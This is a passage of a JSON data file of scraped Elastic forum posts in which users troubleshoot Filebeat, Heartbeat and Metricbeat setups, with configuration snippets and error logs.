      "Beats",
      "Heartbeat"
    ],
    "author": "Mehak_Bhargava",
    "date": "April 7, 2020, 7:49pm April 7, 2020, 7:47pm April 14, 2020, 2:08am",
    "body": "I have my elasticsearch, logstash, kibana running inside docker. The files filebeat ships are from another server. Firstly, I just want to see if up/down status is provided for windows services. Can I install heartbeat on the filebeat server where my logs are or is it better to install on docker? If I install heartbeat inside docker ,this will be my configuration file for heartbeat- heartbeat.monitors: - type: icmp hosts: [\"xxxxx\"] schedule: '@every 10s' timeout: 16s - type: icmp hosts: [\"xxxx\"] I am not sure how to define monitoring windows service's for url.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "97a3f79b-3c19-41b5-a94f-6cf5e4509fc5",
    "url": "https://discuss.elastic.co/t/heartbeat-keeps-getting-restarted/226446",
    "title": "Heartbeat keeps getting restarted",
    "category": [
      "Beats",
      "Heartbeat"
    ],
    "author": "hanjukim",
    "date": "April 3, 2020, 5:32pm April 14, 2020, 1:47am",
    "body": "I am using docker image elastic/heartbeat:6.8.8, and container keeps getting restarted. Full log https://pastebin.com/raw/Aag5Q3eL Configuration ############################# Heartbeat ###################################### heartbeat.config.monitors: # Directory + glob pattern to search for configuration files path: ${path.config}/monitors.d/*.yml reload.enabled: true #============================== Output monitoring ===================================== output.elasticsearch: hosts: [\"elasticsearch:9200\"] index: \"heartbeat-%{[beat.version]}-%{+yyyy}\" #============================== Kibana ===================================== setup: kibana.host: \"kibana:5601\" kibana.protocol: \"http\" #==================== Elasticsearch template setting ========================== setup.template.enabled: true setup.template.name: \"heartbeat\" setup.template.pattern: \"heartbeat-*\" setup.template.overwrite: true setup.template.settings: index: number_of_shards: 1 number_of_replicas: 1 codec: best_compression number_of_routing_shards: 30 #============================== X-Pack monitoring ===================================== xpack.monitoring.enabled: true xpack.monitoring.elasticsearch.url: [\"http://elasticsearch:9200\"] #================================ HTTP Endpoint ====================================== # Defines if the HTTP endpoint is enabled. http.enabled: true # The HTTP endpoint will bind to this hostname or IP address. It is recommended to use only localhost. http.host: localhost # Port on which the HTTP endpoint will bind. Default is 5066. http.port: 5066 #================================ Logging ===================================== logging.level: warning",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "13205dd0-a0bf-4238-ad76-fcc6417aaedb",
    "url": "https://discuss.elastic.co/t/how-to-add-real-host-name-to-heartbeat-for-metricbeat-integration-of-website-url-ip/226288",
    "title": "How to add real host name to heartbeat for metricbeat integration of website url\\ip",
    "category": [
      "Beats",
      "Heartbeat"
    ],
    "author": "shayvilk",
    "date": "April 2, 2020, 9:11pm April 14, 2020, 1:45am",
    "body": "hi there... I'm trying to create a monitoring integration for our web sites. I'm using the heartbeat (standalone docker) for uptime with the external\\public URL and on the sites hosting servers, I've add filebeats and Metricbeats for Logs and Metrics. the issue is that the metricbeats is based on hostname and the heartbeat is based on IP. as I'm using the external URLs and get back the public IP, how can I correlate them to use the uptime integrations for viewing the logs and metrics directly? Thanks, Shay",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "f742f1e9-12ef-4000-a880-6d94f4ea668c",
    "url": "https://discuss.elastic.co/t/aws-vpcflow-errors-count-not-find-region-configuration-context-deadline-exceeded/225471",
    "title": "AWS vpcflow errors - count not find region configuration, context deadline exceeded",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "swisscheese",
    "date": "March 27, 2020, 11:28pm March 30, 2020, 1:54pm April 2, 2020, 11:18pm April 2, 2020, 11:19pm April 2, 2020, 11:34pm April 9, 2020, 5:48pm April 13, 2020, 9:18pm",
    "body": "I have vpc flow logs going to an S3 bucket and an SQS notification for any object creation event. I actually much preferred the logstash method of polling the bucket, for several reasons - mainly the ability to re-index from source easily, use regex matching of file patterns, and general simplicity. The realtime notifications don't provide me with much benefit and just add complexity. I hope to see polling as an option on filebeat some day. Nonetheless, I've set it up, and I am using an instance role on my filebeat node for access to SQS and S3. Here is my aws.yml: module: aws vpcflow: enabled: true var.queue_url: https://sqs.us-west-2.amazonaws.com//vpcflow Although quite a bit of data is being read successfully and I can see it in Kibana, I'm getting a lot of errors and warnings. I have no easy way to tell if it's getting everything, but these messages imply that some may be failing and getting dropped. I can't be certain though, because they're very confusing messages. 2020-03-27T01:27:10.019Z ERROR [s3] s3/input.go:204 failed to receive message from SQS: MissingRegion: could not find region configuration 2020-03-27T01:27:20.019Z ERROR [s3] s3/input.go:204 failed to receive message from SQS: MissingRegion: could not find region configuration 2020-03-27T01:27:20.019Z ERROR [s3] s3/input.go:204 failed to receive message from SQS: MissingRegion: could not find region configuration 2020-03-27T01:27:30.020Z ERROR [s3] s3/input.go:204 failed to receive message from SQS: MissingRegion: could not find region configuration 2020-03-27T01:27:30.020Z ERROR [s3] s3/input.go:204 failed to receive message from SQS: MissingRegion: could not find region configuration 2020-03-27T01:27:40.020Z ERROR [s3] s3/input.go:204 failed to receive message from SQS: MissingRegion: could not find region configuration 2020-03-27T01:27:40.020Z ERROR [s3] s3/input.go:204 failed to receive message from SQS: MissingRegion: could not find region configuration 2020-03-27T01:27:40.887Z ERROR [s3] s3/input.go:475 ReadString failed: context deadline exceeded 2020-03-27T01:27:41.531Z ERROR [s3] s3/input.go:475 ReadString failed: context deadline exceeded 2020-03-27T01:27:41.531Z ERROR [s3] s3/input.go:386 createEventsFromS3Info failed for AWSLogs//vpcflowlogs/us-west-2/2020/03/26/_vpcflowlogs_us-west-2_fl-.log.gz: ReadString failed: conte xt deadline exceeded 2020-03-27T01:27:41.571Z WARN [s3] s3/input.go:277 Processing message failed, updating visibility timeout 2020-03-27T01:27:41.636Z INFO [s3] s3/input.go:282 Message visibility timeout updated to 300 2020-03-27T01:27:41.794Z WARN [s3] s3/input.go:277 Processing message failed, updating visibility timeout 2020-03-27T01:27:41.799Z INFO [s3] s3/input.go:282 Message visibility timeout updated to 300 2020-03-27T01:27:41.993Z WARN [s3] s3/input.go:277 Processing message failed, updating visibility timeout 2020-03-27T01:27:41.997Z INFO [s3] s3/input.go:282 Message visibility timeout updated to 300 Any ideas?",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "bab3f6c5-9970-4fc0-b3b9-e75af246680a",
    "url": "https://discuss.elastic.co/t/preconfigured-dashboards-for-elb-and-billing-in-elasticsearch/227217",
    "title": "Preconfigured Dashboards for ELB and Billing in ElasticSearch",
    "category": [
      "Beats"
    ],
    "author": "vennemp",
    "date": "April 8, 2020, 11:35pm April 9, 2020, 11:44am April 9, 2020, 1:11pm April 9, 2020, 2:48pm April 9, 2020, 2:55pm April 9, 2020, 3:00pm April 9, 2020, 3:01pm April 9, 2020, 3:01pm April 9, 2020, 5:02pm April 13, 2020, 9:13pm",
    "body": "Hey guys, I just started using your product to get AWS metrics in to ELK and love the preconfigured EC2 dashboard. However, I was having some problems with getting the ELB and Billing dashboards to appear. I am using AWS ElasticSearch/Kibana (their ELK as a service) and have enabled the AWS module and configured it properly according to documentation. When I run metricbeat setup, it created a ton of Kibana dashboards but only did EC2 for AWS-related. Not the billing and elb ones. Any idea how to get them? I am running metricbeat version 7.6.2 (amd64), libbeat 7.6.2 [d57bcf8684602e15000d65b75afcd110e2b12b59 built 2020-03-26 05:27:27 +0000 UTC] @Kaiyan_Sheng",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "24d25abf-180b-4eb0-b967-0ac9d30a9517",
    "url": "https://discuss.elastic.co/t/metric-beat-unable-to-detect-all-metricset-from-cloudwatch/227402",
    "title": "Metric beat unable to detect all metricset from cloudwatch",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "Abhishek_Tanwar",
    "date": "April 9, 2020, 8:05pm April 10, 2020, 6:35pm April 10, 2020, 6:46pm April 11, 2020, 9:07am April 12, 2020, 7:46pm April 13, 2020, 4:25am April 13, 2020, 7:24pm April 13, 2020, 7:24pm",
    "body": "I want to detect AWS/SES metric set from cloud watch or basically monitor SES metrics via elastic. I tried to configure \"*\" namespace but still, it doesn't query all of the namespaces. I am have tested with 7.5.1 and 7.6.2 as well.",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "91a5939f-3902-4389-93aa-57a4cdeaa61b",
    "url": "https://discuss.elastic.co/t/a-new-process-has-been-created-appears-from-only-half-the-network-computers/227809",
    "title": "\"A new process has been created\" appears from only half the network computers",
    "category": [
      "Beats",
      "Winlogbeat"
    ],
    "author": "jacobr91",
    "date": "April 13, 2020, 6:08pm",
    "body": "My company's network PCs all have winlogbeats now which feeds into Kibana thatI manage for the network. Every computer has the same config file, but only about half push out the hit when a new process has been created and I can't figure out the differences. I checked multiple computers from the batch where and works and where it doesn't to be sure the config file is the same and they match. Has anyone else seen this before where some of the logs from some computers are not pushed and if so how did you fix it? Thank you for any help you can give me.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "056e6d75-cf8c-436e-96e4-581a3275b93c",
    "url": "https://discuss.elastic.co/t/send-only-some-fields-of-processor-add-host-metadata/227778",
    "title": "Send only some fields of processor 'add_host_metadata'",
    "category": [
      "Beats"
    ],
    "author": "felixbarbeira",
    "date": "April 13, 2020, 1:33pm April 15, 2020, 6:45am",
    "body": "I'm using filebeat and I only need a couple of fields from the processor \"add_host_metadata\". The only way I found to send those events is the following: processors: - add_host_metadata: ~ And then on Elasticsearch ingest pipeline remove all the fields: \"remove\": { \"field\": [ \"host.architecture\", \"host.containerized\", \"host.id\", \"host.os.name\", \"host.os.family\", \"host.os.version\", \"host.os.kernel\" ] } It would be perfect if exist some way to send from filebeat only the fields I want, somebody knows if is this possible?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "8ef118a5-dfdf-42fa-aea4-f151fcf0fd50",
    "url": "https://discuss.elastic.co/t/use-ingest-pipelines-with-output-kafka-specified/227762",
    "title": "Use ingest pipelines with output.kafka specified",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "romanfurst",
    "date": "April 13, 2020, 10:57am April 13, 2020, 2:20pm April 13, 2020, 4:30pm",
    "body": "Hello there, is it possible use ingest pipeline in filebeat without direct connection to logstash (or elastic) ? I mean in our scenario we have specified ouput.kafka (filebeat -> kafka -> logstash -> elastic), however we need make some changes in logs fileds and structure before log is send from filebeat to kafka topic. Also I think it's good to be mention that we use autodiscover setup for our kubernetes environment. So we made custom module and ingest pipeline but it seems it doesnt work. As long as I read documentation I understand that this is not possible to filebate use ingest pipelines to tranfrom logs. Am I right or Im missing something ? Is there any option how make advanced logs transformation in filebaet ? Thank you",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "799ee80a-46ed-4d4f-8dab-753a9e677297",
    "url": "https://discuss.elastic.co/t/filebeat-takes-days-to-start-outputting-events-to-logstash-after-a-restart/226954",
    "title": "Filebeat takes days to start outputting events to Logstash after a restart",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "Saravana37",
    "date": "April 7, 2020, 4:31pm April 13, 2020, 8:48am April 13, 2020, 12:21pm",
    "body": "Hello everyone , Can any one please help me on this serious issue please . We have installed filebeat on PROD server and we have around 50K log files in it. If I restart Filebeat , it takes days to start outputting events to Logstash .If I delete my registry file, Filebeat will start sending events immediately.CPU usage by filebeat is also suspiciously high. I'm not sure what is happening. Also i have to wait for atleast 3-4 days , so that filebeat will start injecting data to logtstash again. i am using 6.8.4 version. I see below info in the debug logs. 2020-04-07T14:20:31.406+0200 DEBUG [acker] beater/acker.go:64 stateful ack {\"count\": 1} 2020-04-07T14:20:31.406+0200 DEBUG [publish] pipeline/client.go:193 Pipeline client receives callback 'onFilteredOut' for event: %+v{0001-01-01 00:00:00 +0000 UTC null null {851968-7591841-3327411174 true <nil> D:\\Siebel\\CACM4TEAIObjMgr_enu_0009_9446404_01.log 672 2020-04-07 12:47:22.7308932 +0200 CEST -1ns log map[] 851968-7591841-3327411174}} So can any one please suggest me how can we avoid this issue ? , If i restart filebeat , i have to wait for 3-4 days so that filebeat will pick logs after that. Anyway , can we configure filebeat to pick logs immediately after restart without deleting registry file ? Kindly help.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "9cbf88e8-6d4f-40e8-92ad-c0f2ccc562ba",
    "url": "https://discuss.elastic.co/t/heartbeat-icmp-question/224097",
    "title": "HeartBeat ICMP question",
    "category": [
      "Beats",
      "Heartbeat"
    ],
    "author": "rguptarg",
    "date": "March 18, 2020, 11:58am March 18, 2020, 3:57pm April 13, 2020, 10:30am",
    "body": "Hi Team, I am new in Heartbeat/ELKStack, can you please help me to understand below points:- Can we use Heartbeat as an opensource? IS there any limitation to configure IP/host for ICMP Monitoring, I have 3000+ servers, so can I monitoring ICMP for all 3000 servers through Heartbeat? If I'll put all hosts details in a file and heartbeat will use that file and monitor ICMP for all hosts. If it's possible, how can I do this. Thanks",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "19ac3ea7-05c2-4cfc-b950-3e5ccd275eed",
    "url": "https://discuss.elastic.co/t/consistent-data-blackouts-followed-by-data-restoration/227389",
    "title": "Consistent data blackouts followed by data restoration",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "anda",
    "date": "April 9, 2020, 6:41pm April 13, 2020, 8:08am",
    "body": "Every day at the same time, all data stops being coming into my cluster for a few hours. When I check again in the morning, all the data is there and there is no gap. When checking /var/log/filebeat I see this error recurring: '''2020-04-08T00:00:25.491-0700 ERROR log/harvester.go:281 Read line error: read /var/ericsson/ddc_data/svc-4-cmserv_TOR/070420/instr.txt: stale NFS file handle; File: /var/ericsson/ddc_data/svc-4-cmserv_TOR/070420/instr.txt''' I thought this was the culprit but other filebeat instances the show this error aren't displaying the same symptoms, and there are no other errors in the filebeat log files. Has anyone experienced this? Would love to get a second opinion on what the issue could be. Linux RHEL7 with ELK + Filebeat stack version 7.3 image788×330 57.5 KB",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "b0328a7b-1c37-4c2a-bd5c-96ce1490a771",
    "url": "https://discuss.elastic.co/t/docker-autodiscover-of-elasticsearch-container/227628",
    "title": "Docker Autodiscover of ElasticSearch container",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "LenaSikirin",
    "date": "April 11, 2020, 7:15pm April 13, 2020, 12:18am",
    "body": "Hi, I'm trying to ship elasticsearch logs using filebeat's autodiscover feature + container input, but don't know how to split different types of es logs properly. For nginx - I can split log easily just by using stream field, but for elasticsearch it is always equals stdout for all 4 types of logs/assets and actual split field is under path log.type . One example of docker log: { \"log\": { \"type\": \"server\", \"timestamp\": \"20xx-04-11T18:20:54,430Z\", \"level\": \"DEBUG\", \"component\": \"o.e.a.a.c.n.t.c.TransportCancelTasksAction\", \"cluster.name\": \"some-cluster\", \"node.name\": \"some-xxxxx\", \"message\": \"Removing ban for the parent [xxxxxx:xxxx] on the node [xxxxx-xxxx]\", \"cluster.uuid\": \"xxx-xxxx\", \"node.id\": \"xxxx-xxxx\" }, \"stream\":\"stdout\", \"time\":\"20xx-04-11T18:11:54.43434Z\" } Here is my bad config file: filebeat.autodiscover: providers: - type: docker templates: # ElasticSearch services - condition.contains: docker.container.image: elasticsearch config: - module: elasticsearch server: input: type: container paths: - /var/lib/docker/containers/${data.docker.container.id}/*.log gc: input: type: container paths: - /var/lib/docker/containers/${data.docker.container.id}/*.log audit: input: type: container paths: - /var/lib/docker/containers/${data.docker.container.id}/*.log slowlog: input: type: container paths: - /var/lib/docker/containers/${data.docker.container.id}/*.log deprecation: input: type: container paths: - /var/lib/docker/containers/${data.docker.container.id}/*.log By using this config - filebeat can ship all of log types with proper pipeline, but it will lead to lots of weird duplicates (because gc pipeline know nothing about slowlog and vice versa). How can I split different types of logs like stream field? (I can add logstash as middleware and depends on log.type specify different pipelines manually, but it looks so weird ) Best regards.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "2959ab09-5fb0-4164-abb5-cff0fa6e88ad",
    "url": "https://discuss.elastic.co/t/filebeat-and-minimal-server-install/227707",
    "title": "Filebeat and Minimal Server Install",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "mrogowski",
    "date": "April 12, 2020, 9:45pm April 12, 2020, 10:10pm April 12, 2020, 10:23pm April 12, 2020, 11:24pm",
    "body": "Hi folks, new user here. I just spent the last two days bashing my head against the wall trying to determine why a minimal server setup (Centos 8) would not send beat info to a remote logstash system. So after exhausting all alternatives, I did a fresh install of Centos 8 Server with GUI on a separate instance. And well, guess what? Beat worked like a charm! So I am wondering what Beat needs to work properly using a minimal setup? Have any of you run into this? Thanks, Mark",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "39075c97-9c33-423b-a31c-9d2e7ede50c4",
    "url": "https://discuss.elastic.co/t/arm64-aarch64-suppport-debian-linux-for-filebeat-metricbeat/227419",
    "title": "ARM64/aarch64 suppport (Debian Linux) for filebeat, metricbeat",
    "category": [
      "Beats"
    ],
    "author": "siva-eh",
    "date": "April 9, 2020, 11:27pm April 10, 2020, 5:53pm April 10, 2020, 11:38pm April 11, 2020, 11:28am April 12, 2020, 9:35pm April 12, 2020, 9:55pm",
    "body": "I have been using rsyslogd as the log forwarder, but I would prefer to use filebeat (and metricbeat). However, arm64/aarch64 is not being built as a standard platform. I installed go, and downloaded v7.6 of beats, but I'm running into compile issues. I suspect these are some sort of settings or environment variables. The error is shown below: sst@sstgateway:~/go/src/github.com/elastic/beats/filebeat$ make filebeat go build -ldflags \"-X github.com/elastic/beats/libbeat/version.buildTime=2020-04-09T23:23:18Z -X github.com/elastic/beats/libbeat/version.commit=d57bcf8684602e15000d65b75afcd110e2b12b59\" github.com/elastic/beats/libbeat/common/file ../libbeat/common/file/helper_other.go:28:6: SafeFileRotate redeclared in this block previous declaration at ../libbeat/common/file/helper_aix.go:26:44 make: *** [../libbeat/scripts/Makefile:122: filebeat] Error 2 It appears to be trying to compile two mutually exclusive files for different operating systems (AIX and Linux). I have gone through the GO environment variables, and they should be correct, but clearly something is amiss. Any help would be gratefully appreciated. I am building this on the target machine. Thanks",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "92193b27-18f9-48d2-9589-eaa6ee604afb",
    "url": "https://discuss.elastic.co/t/filebeat-error/227700",
    "title": "Filebeat-error",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "jatinder10884",
    "date": "April 12, 2020, 8:04pm April 12, 2020, 8:25pm",
    "body": "Hi All, I am facing the below error while running filebeat docker ERROR instance/beat.go:933 Exiting: Error while initializing input: No paths were defined for input accessing 'filebeat.inputs.0' (source:'filebeat.yml') Exiting: Error while initializing input: No paths were defined for input accessing 'filebeat.inputs.0' (source:'filebeat.yml') Please let me know how I can fix this",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "8ea3561a-fdba-4806-9c51-706631ad721a",
    "url": "https://discuss.elastic.co/t/logstash-and-kafka-and-order-of-messages/227651",
    "title": "Logstash and kafka and order of messages",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "arp220",
    "date": "April 12, 2020, 8:32am",
    "body": "Hi. We have an application with the event log, our application send event log to Kafka with JSON format. our topic in Kafka has one partition because we need to read order message, also we use Logstash for consuming event log our problem is considering that the topic has a partition, but the consumer(Logstash) does not read the messages in order and our order is disturbed. we use stdout{ codec => rubydebug } in output Logstash config and this Logstash log confirms the issue. Why the order is messed up. Problems with Kafka or logstash or etc ? thanks.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "b4729e0f-c3b3-472a-bd09-09f17fe83c5b",
    "url": "https://discuss.elastic.co/t/error-creating-new-beat/227567",
    "title": "Error creating new beat",
    "category": [
      "Beats",
      "Beats Developers"
    ],
    "author": "whatgeorgemade",
    "date": "April 10, 2020, 9:54pm April 11, 2020, 10:26pm",
    "body": "I've created beats in the past using the old method by invoking Python. This is the first time I've tried generating one using mage GenerateCustomBeat. I have the beats repo checked out in the right place and pulled latest from master. All other dev dependencies seem correct but when I run mage GenerateCustomBeat, I get the following error: No .go files marked with the mage build tag in this directory. I've followed the new documentation and I'm running the command from my user directory in $GOPATH/src/github.com/{USER}. There's probably something I've missed but I can't figure out what it is. Any help appreciated. Thanks in advance.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "6f6a0662-1d02-462d-9904-da6d6e0c0c89",
    "url": "https://discuss.elastic.co/t/filebeat-suricata-drop-event-not-working/227597",
    "title": "Filebeat - Suricata drop_event not working",
    "category": [
      "Beats"
    ],
    "author": "lw24",
    "date": "April 11, 2020, 10:55am",
    "body": "Hi, I'm trying to add a drop_event condition to drop events with Suricata alert severity below a threshold. Currently I have modified /filebeat/module/suricata/eve/config/eve.yml to contain: drop_event: when: equals.event.severity: 3 But with this saved I am still receiving events with severity of 3. Any thoughts? I have also tried with equals.suricata.eve.severity: 3 and had no luck either.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "6ffdb3f6-d822-4426-87b0-7fd58f566f20",
    "url": "https://discuss.elastic.co/t/metricbeat-kibana-dashboard-with-almost-no-data/226760",
    "title": "Metricbeat: Kibana Dashboard with (almost) no data",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "ffknob",
    "date": "April 6, 2020, 6:02pm April 7, 2020, 12:33pm April 7, 2020, 11:31pm April 10, 2020, 7:28pm April 10, 2020, 8:25pm April 10, 2020, 10:44pm April 10, 2020, 11:10pm",
    "body": "Hi I have a group of Metricbeats collecting metrics every 1m. When I try to view those metrics in the Dashboard / [Metricbeat System] Host overview ECS I get something like this: Bildschirmfoto vom 2020-04-06 14-35-241811×844 112 KB Not much being showed and some visualizations are just incorrect. When I change the time interval from 15m to 24h I get this: Bildschirmfoto vom 2020-04-06 14-53-441841×875 68.4 KB Way better! I didn't have this problem whem my Beats were set to collect every 10s. I think this could be related to this other post here: Metricbeat showing Zero_Percent CPU utilization So what am I doing wrong? Shouldn't I be able to see, say, last 5m metrics, for instance? Is this related to the dashboard's visualizations parameters (maybe they only work for < 1m collects)? Thank you",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "241ec320-8278-4e7d-be9f-6fc143f7bc49",
    "url": "https://discuss.elastic.co/t/aws-sns-not-getting-metrics-return-a-weird-error/220771",
    "title": "AWS SNS not getting metrics, return a weird error",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "odirionyeo",
    "date": "March 16, 2020, 8:00pm March 16, 2020, 8:01pm March 23, 2020, 4:31pm April 10, 2020, 8:13pm",
    "body": "Hello, I deployed the ELK stack on Kubernetes. I have configured all the metrics for AWS SNS, SQS, Cloudwatch, etc. All the metrics setup on metricbeat works but SNS metric set returns a weird error. Here is my config: module: aws labels.dedot: true metricsets: - ec2 - s3_request - s3_daily_storage - rds - sqs - sns - elb - cloudwatch metrics: - namespace: \"AWS/ElastiCache\" - namespace: \"AWS/SNS\" - namespace: \"AWS/SQS\" - namespace: \"AWS/RDS\" period: 300s access_key_id: '${AWS_ACCESS_KEY_ID:\"\"}' secret_access_key: '${AWS_SECRET_ACCESS_KEY:\"\"}' session_token: '${AWS_SESSION_TOKEN:\"\"}' default_region: '${AWS_REGION:eu-west-1}' Here is my error Here is my error1762×1262 413 KB",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "59b3f1f7-5353-45d9-9ef1-19d197611a41",
    "url": "https://discuss.elastic.co/t/filebeat-timestamp-with-nanosecond-precision/227554",
    "title": "[Filebeat] Timestamp with nanosecond precision",
    "category": [
      "Beats"
    ],
    "author": "bmalecki4",
    "date": "April 10, 2020, 7:31pm",
    "body": "My configuration: filebeat + logstash + elasticsearch + kibana (with logtrail) - all in version 7.6.1 I have a mule.log file which contains information without the timestamp field that I could extract to enforce proper order. Snippet from mule.log: --> Wrapper Started as Console Launching a JVM... Java HotSpot(TM) 64-Bit Server VM warning: ignoring option PermSize=256m; support was removed in 8.0 Java HotSpot(TM) 64-Bit Server VM warning: ignoring option MaxPermSize=256m; support was removed in 8.0 Java HotSpot(TM) 64-Bit Server VM warning: Using the ParNew young collector with the Serial old collector is deprecated and will likely be removed in a future release Starting the Mule Container... The problem I have is that current precision in @Timestamp field causes that f.e. lines 1-3 have 2020-06-14T10:04:39.249Z and lines 4-6 have 2020-06-14T10:04:39.250Z. So both group lines (1-3 and 4-6) are out of order in logtrail. For exmaple lines 1-3 appear (f.e.): Java HotSpot(TM) 64-Bit Server VM warning: ignoring option PermSize=256m; support was removed in 8.0 Launching a JVM... --> Wrapper Started as Console instead of: --> Wrapper Started as Console Java HotSpot(TM) 64-Bit Server VM warning: ignoring option PermSize=256m; support was removed in 8.0 Launching a JVM... The same goes for lines 4-6 (and others with the same @Timestamp value). I see that it supposed to be already handled, but either I'm doing somethin wrong (hence the question) or it's only for docker files. I could base order of each \"event\"/\"line\"/\"message\" on the offset field but that is not a clean solution. How can I mark each filebeat event, in orde to be able to keep the proper order of events ? (in my case in logtrail)",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "2db9045e-25f2-4cd6-b49d-d7149f9b8809",
    "url": "https://discuss.elastic.co/t/filebeat-reading-logs-from-s3/226065",
    "title": "Filebeat reading logs from S3",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "Nithya",
    "date": "April 1, 2020, 2:32pm April 2, 2020, 8:26am April 2, 2020, 8:41am April 2, 2020, 8:44am April 2, 2020, 10:30am April 2, 2020, 11:00am April 2, 2020, 12:42pm April 2, 2020, 4:33pm April 3, 2020, 1:19pm April 6, 2020, 3:32pm April 10, 2020, 6:33pm",
    "body": "Hi, I'm trying to get the AWS Logs which is stored in the centralised S3 bucket. I configured the SQS to get the file and push it to the Elastic Cloud index. I'm facing the below problems: When I see the logs, each line from the log file is storing as a separate doc. Getting a gzip invalid header error while uploading the WAF logs and CloudTrail ERROR: 2020-04-01T19:16:31.002+0530|WARN|[s3]|s3/input.go:277|Processing message failed, updating visibility timeout 2020-04-01T19:16:31.011+0530|INFO|[s3]|s3/input.go:282|Message visibility timeout updated to 300 2020-04-01T19:16:31.035+0530|INFO|[s3]|s3/input.go:282|Message visibility timeout updated to 300 2020-04-01T19:16:31.035+0530|ERROR|[s3]|s3/input.go:447|gzip.NewReader failed: gzip: invalid header 2020-04-01T19:16:31.035+0530|ERROR|[s3]|s3/input.go:386|createEventsFromS3Info failed for folder/XXXXXXXXXX/waf_logs/date/filename.gz: gzip.NewReader failed: gzip: invalid header",
    "website_area": "discuss",
    "replies": 11
  },
  {
    "id": "a2d69998-ac0d-4704-bc0c-087a5b5a2975",
    "url": "https://discuss.elastic.co/t/getting-intermittent-parsing-of-json-logs-in-kibana/227146",
    "title": "Getting intermittent parsing of JSON logs in Kibana",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "VictorS",
    "date": "April 8, 2020, 3:00pm April 9, 2020, 12:03pm April 10, 2020, 6:21pm",
    "body": "Hi, I'm trying to do a shift of the current log setup we have in place from text to JSON so that we can accommodate MDC and get more info from our logs. The current setup is pretty basic with no real changes from the standard setup: Filebeat gets the logs and ships them to logstash. I changed the logger in our code, used the logstash.LogstashEncoder for the logback.RollingFileAppender I went in, added the JSON log-related properties to filebeat.yml and am seeing some logs (the live check ones) reaching Kibana however none of the rest are present(not to mention ERROR logs). filebeat.inputs: - type: log enable: \"true\" paths: - /var/log/security_software.log - /var/log/bsmx_logs/**/*.log json.message_key: msg json.keys_under_root: true json.add_error_key: true fields_under_root: true multiline.pattern: '^[:20:]' multiline.negate: true multiline.match: after filebeat.config.modules: path: ${path.config}/modules.d/*.yml reload.enabled: false setup.template.settings: index.number_of_shards: 3 setup.kibana: output.logstash: hosts: [\"10.1.2.12:5044\"] processors: - add_host_metadata: ~ - add_cloud_metadata: ~ I didn't do any changes to the logstash setup. Could that be the cause? Any help is much welcome! LE: I did a bit of additional investigating and it seems that removing the multiline settings resolves my problems. How could I setup different processing based on the type of the log line(text/JSON)? I dug around and saw that setting up a processor could work but which one would work for me?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "b00aed11-b187-477a-beeb-a32177a78aff",
    "url": "https://discuss.elastic.co/t/bug-filebeat-creates-wrong-index-name-on-index-deletion/227100",
    "title": "[BUG] Filebeat creates wrong index name on index deletion",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "vutkin",
    "date": "April 8, 2020, 10:48am April 8, 2020, 11:48am April 8, 2020, 12:45pm April 8, 2020, 1:46pm April 8, 2020, 4:16pm April 8, 2020, 5:30pm April 8, 2020, 5:34pm April 8, 2020, 6:15pm April 8, 2020, 6:31pm April 9, 2020, 2:09pm April 9, 2020, 5:44pm April 10, 2020, 8:33am April 10, 2020, 6:16pm",
    "body": "Hi All, Filebeat affected: 7.6.1/7.6.2, installed via Elastic's helm charts (with default config). ES: 7.5.1 We are running into an issue where setting the ILM policy via filebeat config with the default index pattern of filebeat-7.6.1-%{now/d}<del>000001</del> but instead the index gets the name filebeat-7.6.1 and that seems to ruin the ILM setup, as the index template doesn't match (it's looking for filebeat-7.6.1*) and thus the ILM policy doesn't get applied to the index. Reproduce steps : Need to delete current correct index on running filebeat and it recreate index with wrong name. Healthy image1495×548 47.1 KB Problem image1533×576 39 KB Could you please investigate a bug?",
    "website_area": "discuss",
    "replies": 13
  },
  {
    "id": "5b61353a-e86e-4c47-8217-f6327cf53601",
    "url": "https://discuss.elastic.co/t/is-it-possible-to-obtain-a-file-creation-date-via-filebeat/227124",
    "title": "Is it possible to obtain a file creation date via Filebeat?",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "Guerreiro_Sousa",
    "date": "April 8, 2020, 12:35pm April 10, 2020, 6:03pm",
    "body": "Is it possible to obtain a file creation date via Filebeat? I would like to get this field to include as object of metadata in elastic.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "16c262d0-184f-45c6-a0ac-165cacccabf9",
    "url": "https://discuss.elastic.co/t/implementation-question-central-syslog-server-vs-filebeat-on-each-machine/227517",
